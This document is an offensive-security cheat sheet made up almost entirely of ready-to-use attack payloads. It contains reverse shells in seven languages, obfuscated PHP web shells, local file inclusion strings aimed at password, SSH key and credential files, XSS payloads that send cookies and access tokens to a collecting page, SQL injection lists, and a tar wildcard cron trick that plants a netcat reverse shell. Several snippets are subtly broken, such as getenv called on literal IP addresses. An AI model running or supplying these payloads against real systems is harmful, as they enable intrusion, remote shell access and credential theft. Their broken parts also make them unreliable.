____

### Reverse shell
* #### [Bash](#reverse_shell_bash)
* #### [Python](#reverse_shell_python)
* #### [Netcat](#reverse_shell_netcat)
* #### [PHP](#reverse_shell_php)
* #### [Telnet](#reverse_shell_telnet)
* #### [Ruby](#reverse_shell_ruby)
* #### [Perl](#reverse_shell_perl)
### TTY Spawn Shell
* #### [Python spawn shell](#python_spawn_shell)
* #### [OS system spawn shell](#os_system_spawn_shell)
* #### [Bash spawn shell](#bash_spawn_shell)
* #### [Perl spawn shell](#perl_spawn_shell)
* #### [Ruby spawn shell](#ruby_spawn_shell)
* #### [Lua spawn shell](#lua_spawn_shell)
* #### [IRB spawn shell](#irb_spawn_shell)
* #### [VI spawn shell](#vi_spawn_shell)
* #### [VI(2) spawn shell](#vi2_spawn_shell)
* #### [Nmap spawn shell](#nmap_spawn_shell)
### PHP Reverse Shell
* #### [RCE](#rce_vuln)
* #### [Obfuscate PHP Web Shell](#obfuscate_php_web_shell)
* #### [PHP Reverse Shell](#php_reverse_shell)
### LFI
* #### [Directory Traversal](#directory_traversal)
* #### [PHP Wrapper php://file](#php_wrapper_file)
* #### [PHP Wrapper php://filter](#php_wrapper_filter)
* #### [Useful LFI files (Linux)](#useful_lfi_linux)
* #### [Useful LFI files (Apache)](#useful_lfi_apache)
* #### [Useful LFI files (MySQL)](#useful_lfi_mysql)
* #### [Useful LFI files (Windows)](#useful_lfi_windows)
### XSS
* #### [Data grabber for XSS](#data_grabber_xss)
* #### [XSS in HTML/Applications](#xss_in_app)
  * ##### [Basic Payload](#basic_payload)
  * ##### [Img tag payload](#img_tag_payload)
* #### [XSS in Markdown](#xss_in_markdown)
* #### [XSS in SVG](#xss_in_svg)
* #### [Bypass word blacklist with code evaluation](#bypass_word_blacklist_with_code_evaluation)
### SQL Injection Payloads
* #### [Generic SQL Injection](#generic_sql_injection)
* #### [Time-Based](#time_based)
* #### [Generic Error Based Payloads](#generic_error_based_payloads)
* #### [Authentication Based Payloads](#authentication_based_payloads)
* #### [Order by and UNION Based Payloads](#order_by_and_union_based_payloads)
### Useful Linux command
* #### [SUID Commands](#suid_commands)
* #### [System Version](#system_version)
* #### [Environment Variables](#environment_variables)
* #### [Service Settings](#service_settings)
* #### [Cron Jobs](#cron_jobs)
* #### [Other Users](#other_users)
* #### [Port Forwarding](#port_forwarding)
* #### [TAR Wildcard Cronjob Privilege Escalation](#tar_wildcard_cronjob_privilege_escalation)
### File Transfer
* #### [Bash Upload](#bash_upload)
* #### [Bash Download](#bash_download)
* #### [Netcat](#netcat)
* #### [Python](#python)
* #### [SCP](#scp)

____

### Reverse shell > <a name="reverse_shell_bash"></a>Bash
###### bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'

### Reverse shell > <a name="reverse_shell_python"></a>Python
```python  
python -c 'import sys,socket,os,pty;s=socket.socket()
  s.connect((os.getenv("127.0.0.1"),int(os.getenv("1234"))))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")'
```

### Reverse shell > <a name="reverse_shell_netcat"></a>Netcat
###### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 1234 >/tmp/f

### Reverse shell > <a name="reverse_shell_php"></a>PHP
###### php -r '$sock=fsockopen(getenv("127.0.0.1"),getenv("1234"));exec("/bin/sh -i <&3 >&3 2>&3");'

### Reverse shell > <a name="reverse_shell_telnet"></a>Telnet
###### TF=$(mktemp -u); mkfifo $TF && telnet 127.0.0.1 1234 0<$TF | /bin/sh 1>$TF

### Reverse shell > <a name="reverse_shell_ruby"></a>Ruby
###### ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["127.0.0.1"],ENV["1234"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

### Reverse shell > <a name="reverse_shell_perl"></a>Perl
###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

____

### TTY Spawn Shell > <a name="python_spawn_shell"></a>Python spawn shell
###### python -c 'import pty; pty.spawn("/bin/sh")'

### TTY Spawn Shell > <a name="os_system_spawn_shell"></a>OS system spawn shell
###### echo os.system("/bin/bash")

### TTY Spawn Shell > <a name="bash_spawn_shell"></a>Bash spawn shell
###### /bin/sh -i

### TTY Spawn Shell > <a name="perl_spawn_shell"></a>Perl spawn shell
###### perl —e 'exec "/bin/sh";'

### TTY Spawn Shell > <a name="ruby_spawn_shell"></a>Ruby spawn shell
###### ruby: exec "/bin/sh"

### TTY Spawn Shell > <a name="lua_spawn_shell"></a>Lua spawn shell
###### lua: os.execute("/bin/sh")

### TTY Spawn Shell > <a name="irb_spawn_shell"></a>IRB spawn shell
###### exec "/bin/sh"

### TTY Spawn Shell > <a name="vi_spawn_shell"></a>VI spawn shell
###### :!bash

### TTY Spawn Shell > <a name="vi2_spawn_shell"></a>VI(2) spawn shell
###### :set shell=/bin/bash:shell

### TTY Spawn Shell > <a name="nmap_spawn_shell"></a>Nmap spawn shell
###### !sh

____

### PHP Reverse Shell > <a name="rce_vuln"></a>RCE
```php
<?php system($_GET["cmd"]);?
```
### PHP Reverse Shell > <a name="obfuscate_php_web_shell"></a>Obfuscate PHP Web Shell
```php
<?=`$_GET[0]`?>
Example: http://site.com/path/to/shell.php?0=command 
```
```php
<?=`$_POST[0]`?>
Example: curl -X POST http://site.com/path/to/shell.php -d "0=command" 
```
```php
<?=`{$_REQUEST['_']}`?>
Example: http://site.com/path/to/shell.php?_=command
```
```php
curl -X POST http://site.com/path/to/shell.php -d "_=command" '
```
```php
<?=$_="";$_="'" ;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?>
Example: http://site.com/path/to/shell.php?0=command
```
```php
<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?><?=${'_'.$_}['_'](${'_'.$_}['__']);?>
Example:
http://site.com/path/to/shell.php?_=function&__=argument
http://site.com/path/to/shell.php?_=system&__=ls
```
### PHP Reverse Shell > <a name="php_reverse_shell"></a>PHP Reverse Shell (Pentestmonkey)
###### https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

____

### LFI > <a name="directory_traversal"></a>Directory Traversal
###### some.php?file=../../../../../../../etc/passwd

### LFI > <a name="php_wrapper_file"></a>PHP Wrapper php://file
###### example.php?page=expect://ls

### LFI > <a name="php_wrapper_filter"></a>PHP Wrapper php://filter
###### example.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd

### LFI > <a name="useful_lfi_linux"></a>Useful LFI files (Linux)
```html
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/[0-9]*/fd/[0-9]*
/proc/mounts
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```
### LFI > <a name="useful_lfi_apache"></a>Useful LFI files (Apache)
```html
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
Debian/Ubuntu -> /var/log/apache2/access.log
FreeBSD -> /var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
```
### LFI > <a name="useful_lfi_mysql"></a>Useful LFI files (MySQL)
```html
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
```
### LFI > <a name="useful_lfi_windows"></a>Useful LFI files (Windows)
```html
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt
```

____


### XSS > <a name="data_grabber_xss"></a>Data grabber for XSS
###### Obtains the administrator cookie or sensitive access token, the following payload will send it to a controlled page.
```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>

<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>

<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>
```

### XSS > <a name="xss_in_app"></a>XSS in HTML/Applications
### XSS > <a name="basic_payload"></a>Basic Payload
```html
<script>alert('XSS')</script>

<scr<script>ipt>alert('XSS')</scr<script>ipt>

"><script>alert("XSS")</script>

"><script>alert(String.fromCharCode(88,83,83))</script>
```
### XSS > <a name="img_tag_payload"></a>Img tag payload
```html
<img src=x onerror=alert('XSS');>

<img src=x onerror=alert('XSS')//
     
<img src=x onerror=alert(String.fromCharCode(88,83,83));>

<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>

<img src=x:alert(alt) onerror=eval(src) alt=xss>

"><img src=x onerror=alert("XSS");>

"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
```

### XSS > <a name="xss_in_markdown"></a>XSS in Markdown
```html
[a](javascript:prompt(document.cookie))

[a](j a v a s c r i p t:prompt(document.cookie))

[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)

[a](javascript:window.onerror=alert;throw%201)
```
### XSS > <a name="xss_in_svg"></a>XSS in SVG
```html
<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
 
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
 
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```
### XSS > <a name="bypass_word_blacklist_with_code_evaluation"></a>Bypass word blacklist with code evaluation
```html
eval('ale'+'rt(0)');

Function('ale'+'rt(1)')();

new Function`alert`6``;

setTimeout('ale'+'rt(2)');

setInterval('ale'+'rt(10)');

Set.constructor('ale'+'rt(13)')();

Set.constructor`alert(14)```;
```

____


### SQL Injection Payloads > <a name="generic_sql_injection"></a>Generic SQL Injection
```html
' or '

-- or #

' OR '1

' OR 1 -- -

OR "" = "

" OR 1 = 1 -- -"

' OR '' = '

'='

'LIKE'

'=0--+

OR 1=1

' OR 'x'='x

' AND id IS NULL; --

'''''''''''''UNION SELECT '2
```
### SQL Injection Payloads > <a name="time_based"></a>Time-Based
```html
,(select * from (select(sleep(10)))a)

%2c(select%20*%20from%20(select(sleep(10)))a)

';WAITFOR DELAY '0:0:30'--
```
### SQL Injection Payloads > <a name="generic_error_based_payloads"></a>Generic Error Based Payloads
```html
OR 1=1

OR 1=1#

OR x=y#

OR 1=1--

OR x=x--

OR 3409=3409 AND ('pytW' LIKE 'pytW

HAVING 1=1

HAVING 1=1#

HAVING 1=0--

AND 1=1--

AND 1=1 AND '%'='

WHERE 1=1 AND 1=0--

%' AND 8310=8310 AND '%'='
```
### SQL Injection Payloads > <a name="authentication_based_payloads"></a>Authentication Based Payloads
```html
' or ''-'

' or '' '

' or ''&'

' or ''^'

' or ''*'

or true--

" or true--

' or true--

") or true--

') or true--

admin') or ('1'='1'--

admin') or ('1'='1'#

admin') or ('1'='1'/
```
### SQL Injection Payloads > <a name="order_by_and_union_based_payloads"></a>Order by and UNION Based Payloads
```html
1' ORDER BY 1--+

1' ORDER BY 2--+

1' ORDER BY 3--+

1' ORDER BY 1,2--+

1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+

1' GROUP BY 1,2,3--+

' GROUP BY columnnames having 1=1 --

-1' UNION SELECT 1,2,3--+

' UNION SELECT sum(columnname ) from tablename --

-1 UNION SELECT 1 INTO @,@

-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

____

### Useful Linux command > <a name="suid_commands"></a>SUID Commands
```html
find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} ;

find / -type f -name '*.txt' 2>/dev/null
```
### Useful Linux command > <a name="system_version"></a>System Version
```html
cat /etc/issue

cat /etc/*-release

cat /etc/lsb-release

cat /etc/redhat-release
```
### Useful Linux command > <a name="environment_variables"></a>Environment Variables
```html
cat /etc/profile

cat /etc/bashrc

cat ~/.bash_profile

cat ~/.bashrc

cat ~/.bash_logout

env

set
```
### Useful Linux command > <a name="service_settings"></a>Service Settings
```html
cat /etc/syslog.conf

cat /etc/chttp.conf

cat /etc/lighttpd.conf

cat /etc/cups/cupsd.conf

cat /etc/inetd.conf

cat /etc/apache2/apache2.conf

cat /etc/my.conf

cat /etc/httpd/conf/httpd.conf

cat /opt/lampp/etc/httpd.conf

ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/
```
### Useful Linux command > <a name="cron_jobs"></a>Cron Jobs
```html
crontab -l

ls -alh /var/spool/cron

ls -al /etc/ | grep cron

ls -al /etc/cron*

cat /etc/cron*

cat /etc/at.allow

cat /etc/at.deny

cat /etc/cron.allow

cat /etc/cron.deny

cat /etc/crontab

cat /etc/anacrontab

cat /var/spool/cron/crontabs/root
```
### Useful Linux command > <a name="other_users"></a>Other Users
```html
lsof -i

lsof -i :80

grep 80 /etc/services

netstat -antup

netstat -antpx

netstat -tulpn

chkconfig --list

chkconfig --list | grep 3:on

last
```
### Useful Linux command > <a name="port_forwarding"></a>Port Forwarding
```html
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]

FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]

ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port

ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port

# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe

mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay

mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe...

backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc

localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)
 ```
### Useful Linux command > <a name="tar_wildcard_cronjob_privilege_escalation"></a>TAR Wildcard Cronjob Privilege Escalation
```html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip> 1234 >/tmp/f" > shell.sh

touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"

touch "/var/www/html/--checkpoint=1"
```
